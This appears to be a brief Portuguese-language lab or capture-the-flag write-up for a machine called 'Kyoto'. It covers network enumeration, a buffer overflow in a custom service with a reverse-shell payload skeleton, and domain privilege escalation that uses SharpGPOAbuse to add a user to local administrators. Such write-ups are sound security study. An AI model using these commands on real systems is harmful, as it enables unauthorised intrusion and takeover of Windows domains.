# Kyoto
> DC enum + buffer overflow + SharpGPOAbuse

## Enumeração

```
nmap -sC -sV -oN nmap.txt <IP>
```

```
enum4linux -a <IP>
```

Serviço customizado com buffer overflow identificado.

## Exploração

Análise do binário → identificação de offset e controle de EIP.

```
msf-pattern_create -l 500
msf-pattern_offset -q <EIP value>
```

Exploit desenvolvido com shellcode de reverse shell:

```python
buf = b"A" * offset + struct.pack("<I", ret_addr) + shellcode
```

Acesso inicial obtido como usuário de baixo privilégio.

## Escalada de Privilégio

Usuário com permissão de editar GPO identificado:

```
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "net localgroup administrators <user> /add" --GPOName "Default Domain Policy"
```

```
gpupdate /force
```

Administrador local obtido → SYSTEM.
